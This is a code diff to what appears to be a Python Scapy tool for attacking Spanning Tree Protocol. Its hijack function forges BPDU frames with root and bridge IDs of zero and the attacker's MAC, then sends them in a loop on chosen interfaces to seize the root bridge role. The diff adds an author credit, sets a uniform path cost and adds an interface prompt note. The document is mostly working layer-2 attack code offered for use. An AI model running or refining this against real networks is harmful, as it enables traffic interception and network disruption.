@@ -48,22 +48,20 @@ banner = r""" (           (
 \__ \  | |  |  _/    / _ \  |  _||  _|/ _` |/ _| | / /  
 |___/  |_|  |_|     /_/ \_\  \__| \__|\__,_|\__| |_\_\  
 
+Authors: Jellyyyyyyy
 Use Arrow keys to navigate and Enter to choose an option
 """
 
 
 def hijack(event, interfaces, pkt):
     pkt[0].src = attacks.hijack.settings.mac_address
+    pkt[0].pathcost = 1
     pkt[0].rootid = 0
     pkt[0].rootmac = attacks.hijack.settings.mac_address
     pkt[0].bridgeid = 0
     pkt[0].bridgemac = attacks.hijack.settings.mac_address
     while not event.is_set():
         for interface in interfaces:
-            if interface == "eth1":
-                pkt[0].pathcost = 5
-            else:
-                pkt[0].pathcost = 1
             sendp(pkt[0], loop=0, verbose=0, iface=interface)
         sleep(attacks.hijack.settings.interval)
 
@@ -184,7 +182,7 @@ def get_user_input(prompt, type_check: tuple = (int, float, str, bool, complex))
 
 def select_interface(n):
     stdscr.addstr(banner)
-    interface = select_option(system_interfaces, f'Please choose an interface for interface {n}')
+    interface = select_option(system_interfaces, f'Please choose an interface for interface {n}. Note that only Ethernet interfaces can be used.')
     system_interfaces.remove(interface)
     stdscr.addstr(f"\nYou selected {interface} for interface {n}. Press any key to continue\n")
     stdscr.getch()
